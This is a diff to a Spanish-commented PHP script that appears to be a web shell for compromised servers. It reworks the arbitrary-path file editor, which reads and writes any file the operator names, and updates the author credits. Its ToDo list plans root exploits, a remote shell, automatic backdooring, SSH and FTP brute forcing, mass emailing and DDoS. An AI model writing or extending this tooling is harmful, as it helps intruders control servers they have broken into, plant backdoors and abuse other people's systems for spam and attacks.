@@ -43,6 +43,7 @@
    [!] Mejorada la lectura de archivos con readfile() y file()
    [!] Ya no se muestra la contraseña al ingresarla
    [!] Arreglado bug que saltaba cuando output_buffering era distinto a Off
+   [!] Se eliminó un input del editor de archivos, ahora es mas facil de usar
    
    ToDo:
    [+] Agregar rootexploits
@@ -50,7 +51,6 @@
    [+] Agregar una shell remota tipo datacha0s
    [+] Agregar backdoorizacion automática
    [+] Agregar descripciones en los textarea e input--> onfocus="this.value=''; this.onfocus=null;"
-   [!] Eliminar un input del editor de archivos
    [!] Mejorar las funciones para leer y escribir archivos
    [+] Agregar brute force de ssh
    [+] Agregar brute force de ftp
@@ -58,6 +58,11 @@
    [+] Agregar navegador de sql
    [+] Agregar para mover y copiar los archivos
    [+] Ejecutar comandos con http://us3.php.net/manual/en/function.pcntl-exec.php y http://ar2.php.net/manual/en/function.proc-open.php
+   [+] Agregar para copiar y mover archivos
+   [+] Enviar muchos emails de un saque
+   [+] DDoS ?
+   [+] Poner todas las imágenes en un solo archivo y mostrarlas con css para ahorrar peticiones
+   [+] Usar ajax
  
 */
 
@@ -800,12 +805,13 @@ psybnc.conf
         //mostramos el form para abrir archivos
         echo '
             <form action="?w=editar" method="POST">
-                <input style="width:85%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
-                <input type="submit" value="Editar" style="width:10%;float:right;">
-            </form>';
+                <input style="width:80%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
+                <input type="submit" value="Guardar" name="accion" style="width:7%;float:right;">
+                <input type="submit" value="Abrir" name="accion" style="width:7%;float:right;">
+            ';
         
         //escribimos el archivo
-        if (isset($_POST["contenido"])){
+        if ($_POST["accion"]=="Guardar"){
             if(($ruta!=="") and isset($ruta)){
                 $contenido = $_POST["contenido"];
                 $resultado = escribirarchivo($ruta,$contenido);
@@ -840,10 +846,8 @@ psybnc.conf
         
         //mostramos el formulario
         echo '
-        <form action="?w=editar" method="POST"><br>
+        <br>
             <textarea style="width:100%; height:300px;" name="contenido">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</textarea><br><br>
-            <input style="width:85%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
-            <input type="submit" value="Guardar" style="width:10%;float:right;">
         </form>';
         
     break;
@@ -1065,10 +1069,10 @@ psybnc.conf
         echo '<div style="text-align:center;">
         <a href="?" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>
-        <h2>Programador</h2> <h3>&gt;&gt; s E t H &lt;&lt; <a href="?w=redirect&url=xd-blog.com.ar/">(Blog)</a> <a href="#" onclick="alert(/seth/.source+/@/.source+/el-hac/.source+/ker.org/.source)">(E-mail)</a></h3><br>
-        <h2>Ayuda</h2> <h3>The X-C3LL <a href="?w=redirect&url=0verl0ad.blogspot.com/">(Blog)</a><br>La comunidad Undersecurity <a href="?w=redirect&url=foro.undersecurity.net/">(Foro)</a> <a href="irc://ircnode.com/#undersec">(IRC)</a><br>Zerial <a href="?w=redirect&url=blog.zerial.org/">(Blog)</a><br>S[e]C <a href="?w=redirect&url=chilean-coder.blogspot.com/">(Blog)</a></h3><br>
-        <h2>Pruebas (alfa || beta)</h2> <h3>ksha <a href="?w=redirect&url=forum.mitm.cl/">(Foro)</a><br>S[e]C <a href="?w=redirect&url=chilean-coder.blogspot.com/">(Blog)</a></h3><br>
-        <h2>Iconos</h2><h3><a href="?w=redirect&url=www.famfamfam.com/lab/icons/mini/">famfamfam</a></h3>'; 
+        <h2>Programador</h2> <h3>&gt;&gt; s E t H &lt;&lt; <a href="?w=redirect&url=elrincondeseth.wordpress.com/">(Blog)</a> <a href="#" onclick="alert(/xd./.source+/set/.source+/h@gm/.source+/ail.com/.source)">(E-mail)</a></h3><br>
+        <h2>Ayuda (pruebas, c&oacute;digo, etc)</h2> <h3>The X-C3LL <a href="?w=redirect&url=0verl0ad.blogspot.com/">(Blog)</a><br>La comunidad Undersecurity <a href="?w=redirect&url=foro.undersecurity.net/">(Foro)</a> <a href="irc://ircnode.com/#undersec">(IRC)</a><br>Zerial <a href="?w=redirect&url=blog.zerial.org/">(Blog)</a><br>S[e]C <a href="?w=redirect&url=chilean-coder.blogspot.com/">(Blog)</a><br>ksha <a href="?w=redirect&url=forum.mitm.cl/">(Foro)</a></h3><br>
+        <h2>Gr&aacute;ficos</h2><h3><a href="?w=redirect&url=www.famfamfam.com/lab/icons/mini/">famfamfam</a><br>Moon of Paper <a href="?w=redirect&url=twitter.com/moon_of_paper">(Twitter)</a> <a href="?w=redirect&url=www.moon-of-paper.net/blog/">(Blog)</a></h3>'; 
+
     break;
 
     /* Para redirigir sin referer */
